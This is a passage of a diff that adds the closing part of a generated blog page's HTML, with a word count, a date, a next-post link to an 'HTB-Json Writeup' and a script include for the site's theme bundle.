+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        572 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2026-03-02 14:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="http://localhost:1313/posts/htb-json-writeup/">
+                    <span class="button__text">HTB-Json Writeup</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
